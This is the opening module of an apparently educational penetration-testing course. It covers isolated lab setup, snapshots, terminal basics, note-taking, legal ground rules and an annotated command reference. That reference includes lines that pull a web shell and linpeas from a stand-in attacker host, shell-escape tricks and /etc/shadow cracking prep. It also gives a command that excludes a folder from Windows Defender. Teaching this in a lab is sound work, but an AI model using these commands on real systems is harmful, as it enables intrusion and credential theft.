# 00 — Before You Start

Everything in this path depends on three things being true before you boot your
first target: you have an **isolated lab**, you know the **ground rules**, and you
can **use a terminal without fighting it**. Budget an evening for this page. It is
the highest-return hour in the whole course, because every hour saved here is
recovered thirteen times.

---

## 1. What you need

| Thing | Minimum | Notes |
| --- | --- | --- |
| A computer | 8 GB RAM, 4 cores | 16 GB is much more comfortable |
| Disk space | ~60 GB free | Each VM is 1–4 GB, and snapshots multiply that |
| A hypervisor | **VirtualBox** (free) or VMware Workstation Player | VirtualBox is what most writeups assume |
| An attacker machine | **Kali Linux** 2024+ | Download the *VirtualBox* image, not the installer ISO — it saves hours |
| Thirteen target VMs | Downloaded as you reach each one | **Do not download all thirteen now** — they are large, and you will not reach them for weeks |

The full build procedure — network configuration, importing an OVA, verifying
connectivity — is in [`docs/LAB-SETUP.md`](../docs/LAB-SETUP.md). Read it once,
properly. The single most common reason a beginner "cannot find the target" is a
misconfigured virtual network, not a mistake in their commands.

### The network: host-only, and why

Create a **host-only** network (VirtualBox: `192.168.56.0/24` by default) and put
both Kali and every target on it.

| Mode | Kali reaches target? | Target reaches the internet? | Your LAN at risk? | Use it? |
| --- | :-: | :-: | :-: | :-: |
| NAT | Sometimes, unpredictably | Yes | No | ✗ |
| Bridged | Yes | Yes | **Yes — you are attacking from your real LAN** | ✗ |
| **Host-only** | **Yes** | **No** | **No** | **✓** |

Host-only gives you a private, isolated segment: your VMs can see each other and
your Kali box, and nothing else. That is exactly the shape of a real penetration
test — a network you have been given, with no route out.

### Check it before you blame your tools

```bash
ip -br a          # which interfaces exist, and what addresses they have?
```

```text
lo               UNKNOWN        127.0.0.1/8
eth0             UP             10.0.2.15/24            ← NAT, ignore this one
eth1             UP             192.168.56.10/24        ← host-only: THIS is your lab interface
```

> **How to read it:** `-br` means *brief*. Each line is one interface. The one on
> `192.168.56.0/24` is your lab. **Every scan, listener and reverse shell must use
> that address** — not `127.0.0.1`, and not the NAT one. Getting this wrong
> produces reverse shells that silently never connect, which is an extremely
> confusing first night.

---

## 2. Snapshots: the habit that makes experimentation free

Take a snapshot of every target **immediately after first boot, before you attack
it**, and another of Kali once you have configured it.

Why this matters more than it sounds: these machines are *stateful*. If you
overwrite `/etc/passwd`, corrupt a MySQL database, or fill a disk with a runaway
process, the machine may stop behaving the way the walkthrough describes — and you
will spend an evening debugging something that was never your fault. A snapshot
turns that into a ten-second rewind.

It also changes how you work. When reverting is free, you try the risky thing: the
kernel exploit that might panic the VM, the upload that might break the app,
`rm` inside a directory you are not sure about. **People without snapshots are
timid, and timid people learn slowly.**

```text
VirtualBox → right-click the VM → Snapshots → Take
  Name:   "clean boot"
  Also:   take "after recon" once you know the target's IP and open ports
```

---

## 3. Terminal skills you need on day one

You do not need to be a Linux expert. You need these, fluently:

```bash
# Moving and looking
pwd                       # where am I?
ls -la                    # list everything, including hidden files, with permissions
cd /var/www               # move
cd -                      # go back to the previous directory

# Reading files
cat file.txt              # print it all
less bigfile.txt          # page through it (q to quit, / to search)
head -20 file.txt         # first 20 lines
tail -20 file.txt         # last 20 lines
wc -l file.txt            # how many lines?

# Finding things
grep -i "password" file.txt        # case-insensitive search (-i), shows matching lines
grep -rIn "DB_USER" /var/www/      # recursive (-r), line numbers (-n), skip binaries (-I)
find / -name "*.conf" 2>/dev/null  # by name; 2>/dev/null hides permission errors
find / -type f -perm -u=s 2>/dev/null   # SUID binaries — you will use this a lot

# Permissions (read these, do not memorise the commands)
ls -l                     # -rwsr-xr-x  → the 's' means SUID
id                        # who am I, and what groups am I in?
whoami; hostname; uname -a

# Getting help — the most important skill here
man nmap                  # the manual (q to quit)
nmap --help
searchsploit --help
```

Two things worth understanding now, because they appear constantly:

**Redirection.** `>` writes output to a file (overwriting), `>>` appends, `2>`
redirects *errors*, and `2>/dev/null` throws errors away. `2>&1` sends errors to
wherever standard output is going.

```bash
nmap -p- target > scan.txt          # save the scan
find / -perm -u=s 2>/dev/null       # hide the thousands of "Permission denied" lines
```

**Pipes.** `|` feeds one command's output into the next. This is how you work:

```bash
nmap -sV target | grep open                       # just the open ports
cat /etc/passwd | cut -d: -f1                     # just the usernames
gobuster dir -u http://target -w list.txt | tee results.txt   # see it AND save it
```

> **If a command produces a wall of text, pipe it into `less` or `grep`.** Do not
> scroll. Learning to filter output is half of learning to use these tools.

### Tab completion and history

`Tab` completes file names and commands — use it constantly, it prevents typos.
`↑`/`↓` walk your command history; `Ctrl+R` searches it. `Ctrl+C` kills the
running command (and later you will learn why that misbehaves inside a raw netcat
shell — see [module 06](06-Shells-Persistence-and-Escapes.md)).

---

## 4. Note-taking: build this habit now

Keep one file per machine. Not in your head, not in scrollback — scrollback
disappears.

```text
machine:  Basic Pentesting: 1
ip:       192.168.56.104      mac: 08:00:27:3a:9c:11
started:  2026-10-14 19:40

open ports
  21  vsftpd? no - ProFTPD 1.3.3c     <-- banner says 1.3.3c, check EDB
  80  Apache httpd
  8009
  8080

creds found
  (none yet)

tried / result
  gobuster common.txt on :80   -> /wordpress /simple  (200)
  wpscan --enumerate u         -> admin? vtcsec?
  anonymous FTP                -> ALLOWED, dir listing on

next
  [ ] hydra wordpress login
  [ ] searchsploit ProFTPD 1.3.3c
```

Three reasons this is not optional:

1. **You will forget what you already tried.** Twenty minutes into a machine,
   "did I already run gobuster with extensions?" is unanswerable without notes.
2. **Real engagements require it.** A penetration test report is built from
   contemporaneous notes. Practising the habit on VMs is how you learn to produce
   one under time pressure later.
3. **It makes the walkthrough comparison meaningful.** Step 7 of the study method
   is reproducing every command. You cannot compare against what you did if you
   did not record it.

Also take the screenshots listed in each walkthrough's **Screenshot checklist**.
They exist to force you to actually run the commands rather than read them, and
they become your evidence file.

---

## 5. Ground rules

**Attack only what you own or are authorised to test in writing.** Every machine
in this path is a VM you downloaded and booted yourself, on a network you created.
That is the entire legal basis for what you are doing, and it does not extend one
metre further.

The tools in this course are not "hacking tools" in some special legal category —
`nmap`, `gobuster`, `hydra`, `sqlmap` and Metasploit are ordinary, publicly
available software used by professional testers every day. **What makes an action
a crime is the absence of permission, not the tool.** Running the `hydra` command
from Machine 4 against a real website is an offence in essentially every
jurisdiction, and it is also trivially detectable: it writes thousands of failed
logins into a log someone reads.

Two corollaries worth internalising early:

- **Authorisation is written, scoped and time-bound.** "My boss said I could poke
  at the network" is not authorisation. A signed scope document naming the systems
  and the dates is.
- **Incidental damage is still your responsibility.** Denial-of-service conditions,
  crashed systems and corrupted data during a test are reportable events even when
  the test was authorised. This is why professional testers throttle their tools —
  `hydra -t 4`, not `-t 64` — and why every walkthrough in this repository ends
  with a **defensive lessons** section. Read those. Being able to say *"here is how
  you would have stopped me"* is what makes this a profession.

---

## 6. The method — five stages, always in the same order

```text
  1. RECONNAISSANCE      2. ENUMERATION        3. EXPLOITATION
  "what exists?"   →     "what runs, and     "how do I get in?"
   IP, MAC, live          which version?"
   hosts                  ports, services,
                          versions, CMS, users

           5. REPORT &           4. PRIVILEGE ESCALATION
           CLEANUP       ←       & POST-EXPLOITATION
           what I found,          "how do I become root?"
           how to fix it          sudo, SUID, capabilities,
                                  cron, kernel
```

### What each stage really means

**1. Reconnaissance.** Finding that a target *exists*. In the lab: which IPs are live on my
network. In a real engagement: subdomains, IP ranges owned by the company, database leaks,
employees on LinkedIn, the technologies a site uses. **You send almost nothing to the target
yet** — you look *around* it.

**2. Enumeration.** Now you *talk* to the target. Which ports answer? Which service and which
**version** runs on each port? Which CMS? Which users exist? Which filenames return 200?
**Enumeration is 80% of the work.** Almost every success in this path comes from better
enumeration, not from a cleverer exploit.

**3. Exploitation.** Using a vulnerability for access. It is rarely exotic: usually an old
version with a published exploit, a default setting, or a weak password.

**4. Privilege escalation.** You are in, but as `www-data` — an anonymous service account with
no rights. Now you look for misconfigurations: `sudo`, SUID, capabilities, cron, writable
files, an outdated kernel.

**5. Reporting and cleanup.** What did you leave behind? What did you upload? What did you
delete? In a real engagement this is called **remediation** and it is a contractual obligation.

## 7. Self-check

Answer without looking. If you struggle, re-read the matching section.

<details>
<summary><b>1.</b> What does <code>192.168.56.0/24</code> mean, and how many usable addresses does it give?</summary>

The first 24 bits are the network prefix (`192.168.56`), the remaining 8 are the host.
2⁸ = **256** addresses (`.0`–`.255`), of which `.0` is the network address and `.255` the
broadcast address — so **254 usable**.
</details>

<details>
<summary><b>2.</b> What is the difference between <code>></code> and <code>>></code>?</summary>

`>` **replaces** the file's contents; `>>` **appends**. `>` is dangerous because you lose data
without warning.
</details>

<details>
<summary><b>3.</b> Why does <code>cmd > out.txt 2>&1</code> capture errors but <code>cmd 2>&1 > out.txt</code> not?</summary>

Because redirection is evaluated **left to right**. In the first form fd 1 goes to the file
first, and *then* fd 2 copies fd 1's destination (the file). In the second, at the moment fd 2
copies fd 1, fd 1 still points at the screen.
</details>

<details>
<summary><b>4.</b> What are the five stages, and where do you actually "talk" to the target?</summary>

Reconnaissance → Enumeration → Exploitation → Privilege escalation → Reporting/cleanup.
Reconnaissance happens **around** the target (files, logs, third-party sources); from
enumeration onward you send packets **to** the target and appear in its logs.
</details>

<details>
<summary><b>5.</b> Why must the lab be host-only and not bridged?</summary>

On a bridged network the target is a member of your real network: it can scan you back, and it
can **send outward** (a reverse shell to the wrong address, a worm, ARP poisoning), and see your
other machines. Host-only creates an isolated network between host and VM only.
</details>

## 8. What to read next

Before Machine 1, read [`01-Foundations-Networking-and-Recon.md`](01-Foundations-Networking-and-Recon.md).

If you want the full fundamentals rather than the path-focused summary, the
repository primer is [`docs/CONCEPTS.md`](../docs/CONCEPTS.md) — eighteen sections
covering networking, how nmap works, enumeration, wordlists, shells, web attack
classes, cracking and Linux privilege escalation. Every walkthrough in this
collection links into it at the point each concept first appears. The modules in
this folder tell you **what matters for these thirteen machines**; the primer
explains everything.

Also worth knowing about:

- [`docs/TOOLS.md`](../docs/TOOLS.md) — what each tool is for
- [`docs/BEGINNER-PATH.md`](../docs/BEGINNER-PATH.md) — the older tiered list of
  beginner machines, now annotated with global difficulty ranks
- [`README.md#difficulty-scale`](../README.md#difficulty-scale) — what bands 1–8
  mean, so you can choose your next machine after this path

---

## 9. Annotated command reference — the terminal itself

Everything in this path is typed into a terminal. This section reads the commands you will
use most, with their inputs explained and their outputs decoded. Work through it once with
a terminal open; it will save you hours later.

---

### 9.1 Reading a prompt, and the anatomy of a command line

```text
kali@kali:~/Cybersecurity101-Labs$ sudo nmap -sV -p- 192.168.56.104 > scan.txt 2>&1 | tee -a log.txt
```

| Piece | Meaning |
| --- | --- |
| `kali@kali` | **user@host** |
| `~/Cybersecurity101-Labs` | the current directory, with `~` meaning your home |
| **`$`** | you are an **ordinary user**. **`#`** would mean root. This single character is the fastest orientation check there is |
| `sudo` | run the next command as root (after authenticating) |
| `nmap` | the program — resolved by searching `$PATH` left to right |
| `-sV -p-` | **flags**: options that change behaviour. `-p-` means "all ports" |
| `192.168.56.104` | the **argument**: what to act on |
| `> scan.txt` | redirect **stdout** (fd 1) to a file, **overwriting** it |
| `2>&1` | redirect **stderr** (fd 2) to wherever fd 1 currently points |
| `\| tee -a log.txt` | pipe stdout into `tee`, which writes to the file **and** to the screen (`-a` appends) |

**Order matters with redirection.** `command > file 2>&1` captures both streams.
`command 2>&1 > file` captures only stdout, because `2>&1` is evaluated *before* `>` moves
fd 1 — stderr still points at the terminal. This trips up everyone once.

**The same reason `sudo echo x >> /etc/passwd` fails:** the shell performs the `>>`
redirection *before* `sudo` runs, so the write is attempted by your unprivileged shell.
Use `echo x | sudo tee -a /etc/passwd`, which moves the write inside the privileged
process.

---

### 9.2 Navigation and listing

```bash
pwd
ls -la /etc
cd /var/www/html && ls
cd - && cd ..
```

```text
/var/www/html
total 68
drwxr-xr-x  4 root root  4096 May 11 09:12 .
drwxr-xr-x 14 root root  4096 May 11 09:12 ..
-rw-r--r--  1 root root 10701 Dec  7  2017 index.html
-rw-r--r--  1 root root    41 Dec  7  2017 robots.txt
drwxr-xr-x  3 root root  4096 Dec  7  2017 secret
-rw-r-----  1 root root   227 Dec  7  2017 .htpasswd
lrwxrwxrwx  1 root root    11 Dec  7  2017 config -> /etc/app.cfg
```

| Flag | Meaning |
| --- | --- |
| `-l` | **long** format: permissions, links, owner, group, size, date, name |
| `-a` | **all** entries, including those starting with `.` |
| `-h` | human-readable sizes (`4.0K`, `12M`) |
| `-t` | sort by modification time, newest first — **excellent for finding what changed recently** |
| `-r` | reverse the sort order |
| `-R` | recurse into subdirectories |
| `-i` | show inode numbers — two names with the same inode are hard links to one file |

**Read the type character first.** `d` = directory, `-` = regular file, **`l` = symbolic
link**, `s` = socket, `p` = named pipe, `b`/`c` = block/character device. The `config ->
/etc/app.cfg` symlink tells you the real file lives in `/etc`, which is often outside the
web root and therefore not directly downloadable — a distinction that decides whether an
LFI is useful.

**`-a` is not optional when hunting.** `.htpasswd`, `.env`, `.git/`, `.bash_history`,
`.ssh/` — the interesting files are hidden by convention, and convention is exactly where
CTF authors and careless administrators put things. `total 68` is the sum of blocks used,
which is *not* the sum of file sizes and should not be read as one.

`cd -` returns to the **previous** directory (the shell remembers one), `cd ..` goes up one
level, `cd` alone goes home, and `&&` chains commands so the second runs only if the first
succeeded.

---

### 9.3 Reading files without destroying them

```bash
cat /etc/hostname
head -20 /etc/passwd
tail -f /var/log/auth.log
less /var/www/html/index.php
grep -rniE 'password|secret|api_key' /var/www/html/ | head -20
wc -l fsocity.dic
```

| Command | Meaning |
| --- | --- |
| `cat FILE` | print the whole file. Fine for short files; useless for 14 million lines |
| `head -n FILE` | first *n* lines (`-20` is shorthand for `-n 20`) |
| `tail -n FILE` | last *n* lines. **`tail -n +2`** means "start at line 2", i.e. skip the first — used on Machine 13 to drop the root line from `/etc/shadow` |
| `tail -f FILE` | **follow**: keep printing as the file grows. Ideal for watching a log while you attack |
| `less FILE` | page through it. **Use `less`, never `more`**: `/` searches forward, `?` backward, `n` next match, `G` end, `g` start, `-N` shows line numbers, `!CMD` runs a shell command (which is also a privilege-escalation vector), `q` quits |
| `wc -l` | count lines · `wc -c` bytes · `wc -w` words |
| `strings -n 6 FILE` | print runs of ≥6 printable characters from a binary |
| `file FILE` | identify the type by content, not by extension |
| `od -An -tx1 FILE` | hex dump (`xxd` is often absent; `od` always exists) |

**`grep` is the tool you will use most, so learn its flags:**

| Flag | Meaning |
| --- | --- |
| `-r` | **recursive** through a directory tree |
| `-n` | print the **line number** — essential for citing evidence |
| `-i` | **ignore case**. `Password`, `PASSWORD` and `password` all match |
| `-E` | **extended** regex, so `\|`, `+`, `?` and `()` work without backslashes |
| `-v` | **invert**: print lines that do *not* match. `grep -v nologin /etc/passwd` lists accounts that can log in |
| `-c` | print only a **count** |
| `-l` | print only **filenames** that matched |
| `-A n` / `-B n` / `-C n` | *n* lines **After**, **Before**, or **Context** around each match |
| `-o` | print only the matched part, not the whole line |

```text
$ grep -rniE 'password|secret' /var/www/sites/default/settings.php
12:  'password' => 'R0ck3t',
```

`12:` is the line number, so you can cite it precisely in a report: *credentials in
plaintext at `settings.php` line 12.* That is the difference between "I found a password"
and an actionable finding.

**`grep -A6` in practice** — Machine 3 uses `grep -A6 databases` to print the match plus
the six following lines, which is exactly the shape of a PHP array literal. When you do not
know how many lines a block occupies, `-A`/`-C` beats running the command five times.

---

### 9.4 Permissions

```bash
ls -l /opt/md5check.py
chmod 600 /home/user/.ssh/authorized_keys
chmod u+s /usr/local/bin/find
chmod -R go-w /var/www
chown root:root /etc/passwd
id
stat /etc/shadow
```

```text
-rwxrwxrwx 1 root root 1024 Apr 30  2020 /opt/md5check.py
```

**Mode bits can always be written two ways**, and you should be fluent in both:

| Symbolic | Octal | Meaning |
| --- | --- | --- |
| `rwxrwxrwx` | **777** | everyone can read, write and execute — Machine 9's world-writable root cron script |
| `rwxr-xr-x` | **755** | owner does everything; others read and execute. Normal for directories and scripts |
| `rw-r--r--` | **644** | owner reads and writes; others read. Normal for files — and the *correct* mode for `/etc/passwd` |
| `rw-------` | **600** | owner only. Correct for private keys and `authorized_keys` |
| `-rwsr-xr-x` | **4755** | 755 **plus the SUID bit** (`s` replaces the owner's `x`) |
| `r--r-----` | **440** | read-only for owner and group — correct for `/etc/sudoers` |

The octal digits are just `r=4, w=2, x=1` added per triad: owner, group, other. `7 = 4+2+1`,
`5 = 4+1`, `6 = 4+2`. The SUID bit is `4000`, SGID `2000`, sticky `1000` — which is why
`find -perm -4000` means "has the SUID bit".

| Command | Meaning |
| --- | --- |
| `chmod 600 FILE` | set absolute permissions |
| `chmod u+s` / `chmod g+s` / `chmod o+w` | **symbolic**: add SUID for user, SGID for group, write for other |
| `chmod -R` | recurse into directories |
| `chmod go-w` | remove write from group and other — the fix for a loose `authorized_keys` |
| `chown user:group FILE` | change owner and group |
| `stat FILE` | everything `ls -l` shows, plus **access, modify and change times** and the inode. `Change:` (ctime) cannot be set by a user, so it is the timestamp that survives an attacker trying to hide their tracks with `touch -d` |

---

### 9.5 Finding things

```bash
find / -name '*.php' -type f 2>/dev/null | head -20
find /var/www -newer /etc/hostname -type f
find / -perm -4000 -type f 2>/dev/null
find /etc -writable -type f 2>/dev/null
find . -exec /bin/sh \; -quit
```

| Token | Meaning |
| --- | --- |
| `/` | where to start. `.` means the current directory |
| `-name '*.php'` | match the filename. **Quote the pattern** — unquoted, your shell expands `*.php` against the *current* directory before `find` ever sees it |
| `-iname` | case-insensitive `-name` |
| `-type f` | regular files only (`d` directories, `l` symlinks) |
| `-perm -4000` | permissions that include at least these bits — the SUID search |
| `-writable` | files you can write, considering your UID, groups and ACLs |
| `-newer FILE` | modified more recently than FILE — a superb way to list "everything that changed since I arrived" |
| `-size +10M` | larger than 10 megabytes |
| `-mtime -1` | modified within the last day |
| `-not -path '/proc/*'` | exclude a subtree |
| `-exec CMD {} \;` | run `CMD` on each result, `{}` replaced by the filename, `\;` terminating (escaped so your shell does not eat the semicolon) |
| `-quit` | stop after the first match — how you get *one* shell from `find . -exec /bin/sh \; -quit` instead of one per directory |
| `2>/dev/null` | discard the hundreds of `Permission denied` messages `find` produces as root-less user |

---

### 9.6 Pipes, redirection and getting files across

```bash
nmap -sV TARGET | grep open
sort -u fsocity.dic | wc -l
cat /etc/passwd /etc/shadow | unshadow /etc/passwd /etc/shadow > combined.txt
python3 -m http.server 8000                 # ATTACKER
wget http://ATTACKER:8000/linpeas.sh -O /tmp/linpeas.sh   # TARGET
curl -o shell.php http://ATTACKER:8000/shell.php
base64 -w 0 shell.php                       # then paste into a GET parameter
```

| Token | Meaning |
| --- | --- |
| `\|` | pipe: connect the left command's stdout to the right command's stdin. **The single most useful character in Unix** |
| `>` | write stdout to a file, **truncating** it first |
| `>>` | **append** |
| `2>` | redirect stderr · `2>&1` send stderr where stdout goes · `&>/dev/null` discard both |
| `sort -u` | sort and remove duplicates · `sort -u -o FILE FILE` writes back in place safely |
| `uniq -c` | count consecutive duplicates (needs sorted input) |
| `tr ' ' '\n'` | translate characters — here, spaces to newlines, so a word list on one line becomes one word per line |
| `cut -d: -f1` | split on `:` and print field 1 — `cut -d: -f1 /etc/passwd` lists usernames |
| `awk '{print $1}'` | print the first whitespace-delimited column; `awk -F: '{print $1}'` sets the field separator |
| `tee FILE` | write to a file **and** to the screen, so you can read output while saving it |
| `python3 -m http.server 8000` | a complete static file server for the current directory. The log line `CLIENT - - [time] "GET /path HTTP/1.1" 200 -` is your proof the target fetched the file |
| `wget URL -O FILE` | download to a named file. `-r` mirrors recursively, `-q` is quiet |
| `curl -o FILE URL` | the same with curl; `-O` uses the remote filename |
| `base64 -w 0` | encode with **no line wrapping** — required when the result goes into a URL or a single-line command |

**`printf '%s'` instead of `echo`.** `echo 'x' | base64` encodes a trailing newline, so
decoding gives you an extra blank line and byte-exact comparisons fail. `printf '%s' 'x'`
writes exactly the bytes you asked for. Use `echo` for reading; use `printf` for anything
you will compare or transmit.

**Verify every transfer:**

```bash
md5sum linpeas.sh          # on both machines; identical output = intact file
```

A truncated download produces a `gcc` error or a `bash: syntax error` that looks like a bug
in the tool. Comparing checksums takes two seconds and eliminates a whole class of phantom
problems.

---

### 9.7 Processes, and knowing where you are

```bash
ps aux | head
ps -ef | grep apache
whoami
hostname
ip -br a
stty size
uname -a
```

```text
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1  18084  2944 ?        Ss   09:12   0:01 /sbin/init
root         402  0.0  0.2  78432  5632 ?        Ss   09:12   0:00 /usr/sbin/sshd -D
www-data     811  0.3  1.1 234560 11264 ?        S    09:13   0:04 /usr/sbin/apache2 -k start
root        1204  0.0  0.0   4628   812 ?        S    09:15   0:00 /bin/sh -c /opt/md5check.py
```

| Column | Meaning |
| --- | --- |
| `USER` | **who owns the process** — the column that matters most for escalation |
| `PID` | process ID; `1` is always `init`/`systemd`, the ancestor of everything |
| `%CPU` / `%MEM` | current usage |
| `VSZ` / `RSS` | virtual size and **resident** (actually-in-RAM) size, in KB |
| `TTY` | the controlling terminal. **`?` means none** — a daemon, or a shell obtained without a PTY |
| `STAT` | `S` sleeping, `R` running, `Z` zombie, `s` session leader, `+` foreground |
| `COMMAND` | the full command line, including arguments |

**Read the `USER` column as a map of the machine's trust boundaries.** `www-data` running
`apache2` tells you a web compromise lands you there and no higher. `root` running
`/bin/sh -c /opt/md5check.py` is the line that wins Machine 9 — a root-owned process
executing a script you may be able to rewrite.

`ps` is a **snapshot**: it shows what exists at the instant you run it. A job that runs for
200 ms every five seconds will almost never appear. That is what `pspy` is for (module 05).

`stty size` prints `rows cols` for your current terminal — capture it *before* you upgrade a
shell to raw mode, so you can set the remote side to match.

---

### 9.8 Job control and terminal repair

| Keys / command | What happens |
| --- | --- |
| `Ctrl+C` | SIGINT to the foreground process — "please stop" |
| `Ctrl+Z` | SIGTSTP — **suspend** it. It stays alive in the background |
| `jobs` | list suspended/background jobs, numbered `[1]`, `[2]` |
| `fg` / `bg` | bring job 1 to the foreground / resume it in the background. `fg %2` selects job 2 |
| `Ctrl+D` | end-of-file on stdin — exits a shell, an `ftp`/`mysql`/`psql` prompt, or a `nc` session |
| `Ctrl+L` | clear the screen (same as `clear`) |
| `Ctrl+R` | search your command **history** backwards. Type part of a command; Enter runs it, `→` edits it |
| `Ctrl+A` / `Ctrl+E` | jump to the start / end of the line |
| `Ctrl+U` / `Ctrl+K` | delete before / after the cursor |
| `Ctrl+W` | delete the word before the cursor |
| `Tab` | complete a filename or command. **Tab twice** lists the candidates |
| `!!` | the previous command — `sudo !!` re-runs it with sudo, which is what you want nine times out of ten |
| `reset` | reinitialise the terminal. **Type it blind and press Enter** when the display is garbage or echo is off |
| `stty sane` | restore normal terminal settings without clearing the screen |
| `history \| tail -20` | your last 20 commands — also where your passwords are, if you typed them on a command line |

`Ctrl+C` killing your `nc` listener mid-lab is not a mystery: before the TTY upgrade, your
**local** terminal driver turns `Ctrl+C` into SIGINT for the local foreground process, which
is `nc`. Module 06 explains the fix (`stty raw -echo`).

---

### 9.9 Getting help — the three levels

```bash
nmap --help              # 1. a quick summary of the most common flags
man nmap                 # 2. the full manual.  /search, n next, q quit
man 5 passwd             # 3. a specific manual SECTION
sqlmap -hh               #    tools with huge option sets use their own extended help
tldr nmap                #    community examples, where installed
info coreutils 'ls'      #    GNU's own docs, more current than some man pages
```

**`man` sections are worth knowing**, because the same name can be a command, a file format
and a library call: `1` user commands · `2` system calls · `3` library functions · `4`
device files (`man 4 null`) · **`5` file formats** (`man 5 passwd`, `man 5 shadow`,
`man 5 sudoers`) · `7` conventions · `8` system administration commands. When you want to
know the *fields* of `/etc/passwd`, `man 5 passwd` answers in one screen — and it is the
authoritative source, not a blog post.

Inside `man`: press `/`, type your search, Enter; `n` for the next match, `N` for the
previous; `q` to quit. Searching a man page for a flag you half-remember is faster than
searching the web, works offline, and is accurate for the version you actually have
installed — which the web is not.

---

### 9.10 Basic Linux commands — files, directories and editors

The tools in this course are only half the story. The other half is **moving around a
filesystem and editing a file** without leaving the terminal. These are the commands you will
type more than any other, so learn them here once.

**Navigation and directories**

```bash
pwd                       # print working directory — "where am I?"
ls                        # list the current directory
ls -la /etc               # long format, including hidden files
cd /var/www/html          # change directory
cd ..                     # go UP one level
cd ../..                  # up two levels
cd -                      # back to the PREVIOUS directory
cd                        # with no argument: go home (~)
cd ~/scans && ls          # && runs the next command only if the first succeeded
mkdir scans               # make a directory
mkdir -p a/b/c            # -p makes parent directories too, and does not fail if they exist
```

**Creating, copying, moving and deleting**

```bash
touch notes.md            # create an empty file (or update its timestamp)
echo "hello" > f.txt      # write to a file (overwrites it)
echo "more"  >> f.txt     # append to a file
cat > f.txt <<'EOF'       # heredoc: type several lines, end with a line containing EOF
line one
line two
EOF
cp f.txt f.bak            # copy a file
cp -r dir/ dir.bak/       # copy a directory (-r = recursive)
mv f.txt g.txt            # RENAME (same directory)
mv f.txt /tmp/            # MOVE (different directory)
rm f.txt                  # delete a file  — there is no undo
rm -r dir/                # delete a directory and everything in it
rm -f f.txt               # force, never prompt
```

> **`mv` is "rename OR move" — it is the same command.** And **`rm` has no recycle bin**: on a
> real engagement, deleting the wrong file destroys evidence. Before `rm -r`, run `ls` on the
> same path. (This is also why you take **snapshots** — §2.)

**Reading and editing**

```bash
cat /etc/hostname         # print a (short) file
less /etc/passwd          # page through a file: /search, n next, G end, q quit
nano notes.md             # the beginner editor — see keys below
vim notes.md              # the pro editor — see survival kit below
```

**`nano`** is the friendly one. The keys it shows at the bottom are `^` = `Ctrl`:

| Key | Action |
| --- | --- |
| `Ctrl+O`, Enter | **save** (Write Out) |
| `Ctrl+X` | **exit** (asks to save if you changed something) |
| `Ctrl+W` | search |
| `Ctrl+K` / `Ctrl+U` | cut the current line / paste it back |

**`vim`** is everywhere and will not go away, so learn the **survival kit** — you can do 95% of
lab work with these:

| Key | Action |
| --- | --- |
| `i` | **insert** mode (start typing). `Esc` returns to normal mode |
| `Esc` | leave insert mode (do this before any `:` command) |
| `:w` | write (save) |
| `:q` | quit |
| `:wq` or `:x` | save **and** quit |
| `:q!` | quit **without** saving |
| `/word` then Enter | search; `n` next, `N` previous |
| `dd` | delete a line · `u` undo · `gg` top · `G` bottom |

> **Why `vim` matters beyond editing.** It is a **privilege-escalation primitive**: if a SUID
> binary or a `sudo` rule lets you run `vim`, then `:!sh` gives you a shell as its owner
> ([GTFOBins](https://gtfobins.github.io/gtfobins/vim/)). It is also how you **escape `rbash`**
> (Machine 4): `:set shell=/bin/bash` then `:shell`. The same applies to `nano` (`^R` `^X`),
> `less` (`!sh`) and `man` (`!sh`).

**A five-second orientation habit.** When you land on a new box, run these before anything else:

```bash
id; whoami; hostname; pwd; uname -a; cat /etc/os-release
```

They tell you *who you are*, *where you are*, and *what the machine is* — the three things every
later decision depends on.

### 9.11 Windows / Antivirus — keeping your lab files safe

If you cloned this repository on Windows, Windows Defender may flag educational PHP/reverse-shell snippets inside Markdown files as false positives. To exclude the repository folder (once, in an elevated PowerShell prompt) and restore any quarantined files from git:

```powershell
Add-MpPreference -ExclusionPath "C:\path\to\Cybersecurity101-Labs"
(Get-MpPreference).ExclusionPath
```

```bash
git status            # check whether any tracked files were removed
git checkout -- .     # restore all tracked files from git
```

See the full walkthrough in [`docs/LAB-SETUP.md` §10](../docs/LAB-SETUP.md#10-windows--antivirus--keep-your-lab-files-from-being-deleted) and [`docs/AUDIT.md`](../docs/AUDIT.md).

---

_Back to [Learning Path 1](README.md) · next: [01 — Foundations](01-Foundations-Networking-and-Recon.md)._
